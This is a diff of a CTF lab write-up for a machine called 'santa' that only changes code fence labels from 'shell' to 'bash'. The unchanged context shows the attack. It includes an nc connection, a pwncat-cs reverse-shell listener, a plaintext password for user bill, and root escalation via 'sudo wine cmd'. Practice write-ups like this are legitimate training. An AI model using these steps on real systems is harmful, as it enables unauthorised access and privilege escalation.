@@ -116,7 +116,7 @@ PORT      STATE SERVICE VERSION
 
 尝试连接 65415 这个端口，得到
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $ nc 192.168.56.124 65415
 GET /
@@ -129,7 +129,7 @@ user.txt
 
 ## User - alabaster
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $ pwncat-cs -lp 8888
 [18:00:50] Welcome to pwncat 🐈!
@@ -142,7 +142,7 @@ alabaster
 
 ### flag - user
 
-```shell
+```bash
 (remote) alabaster@santa:/home/alabaster$ cat user.txt
                  ..'''::::...
               .::'`'''':::..
@@ -222,7 +222,7 @@ bill:JingleBellsPhishingSmellsHackersGoAway
 
 ## User - bill
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $ pwncat-cs bill@192.168.56.124
 [18:57:52] Welcome to pwncat 🐈!
@@ -246,7 +246,7 @@ User bill may run the following commands on santa:
 
 ## User - root
 
-```shell
+```bash
 $ sudo /usr/bin/wine cmd
 it looks like wine32 is missing, you should install it.
 multiarch needs to be enabled first.  as root, please
@@ -266,7 +266,7 @@ SANTA\root
 
 ### flag - root
 
-```shell
+```bash
 Z:\root>type root.txt
                                ..,,,,,,,,,,,,,,,,..
                         ..,,;;;;;;;;;;;;;;;;;;;;;;;;;;,,.
